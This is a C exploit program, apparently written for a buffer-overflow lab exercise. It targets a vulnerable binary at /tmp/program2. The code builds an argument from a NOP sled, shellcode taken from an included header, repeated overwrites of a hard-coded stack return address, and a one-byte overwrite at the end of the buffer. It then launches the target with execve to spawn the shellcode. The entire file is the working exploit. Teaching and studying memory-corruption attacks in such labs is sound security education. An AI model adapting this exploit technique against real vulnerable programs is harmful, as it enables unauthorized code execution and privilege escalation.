#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define PROGRAM "/tmp/program2"

int main(void)
{
  char *args[3];
  char *environ[1];

  char ex[101];

  for (int i=0; i<100; i++){
  	ex[i]='\x90';
 }
  int shell_index=0;
  for (int i=20 ; i<65;i++){
  ex[i]=shellcode[shell_index];
   shell_index++;
  }
  
  ex[84]= '\x78';
  ex[85]= '\xdd';
  ex[86]= '\xff';
  ex[87] ='\xff';



  ex[88]= '\x78';
  ex[89]= '\xdd';
  ex[90]= '\xff';
  ex[91] ='\xff';

  ex[92]= '\x78';
  ex[93]= '\xdd';
  ex[94]= '\xff';
  ex[95] ='\xff';

  ex[100]='\xc8';
		  
  args[0] = PROGRAM;
  args[1] = ex;
  args[2] = NULL;
  environ[0] = NULL;

  if (0 > execve(PROGRAM, args, environ))
    fprintf(stderr, "call to execve failed.\n");

  return 0;
}
